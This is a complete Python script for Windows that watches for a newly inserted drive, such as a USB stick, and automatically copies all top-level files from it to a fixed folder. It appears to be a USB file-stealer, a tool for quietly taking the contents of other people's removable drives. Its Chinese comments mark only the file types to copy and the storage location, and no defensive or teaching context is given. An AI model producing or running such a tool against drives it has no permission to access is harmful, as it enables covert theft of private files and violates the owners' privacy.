import os,time

import shutil


old_disk_list=[]

def file_extension(path):
  return os.path.splitext(path)[1]


for i in range(65,91):
    vol = chr(i) + ':'
    if os.path.isdir(vol):
        old_disk_list.append(vol)
def copy(old_disk_list,new_disk_list):
    p = [item for item in new_disk_list if item not in old_disk_list]
    new_path_disk = p[0]
    for i in os.listdir(new_path_disk):
        path = new_path_disk+"\\"+i
        #要复制的文件类型
        if os.path.isfile(path):
            print(i)
            #存储位置
            shutil.copy(path,r'J:\\sources')
    print('ok')
while 1:
    new_disk_list = []
    time.sleep(4)
    for i in range(65,91):
        vol = chr(i) + ':'
        if os.path.isdir(vol):
            new_disk_list.append(vol)
    if new_disk_list != old_disk_list:
        copy(old_disk_list,new_disk_list);
        break;
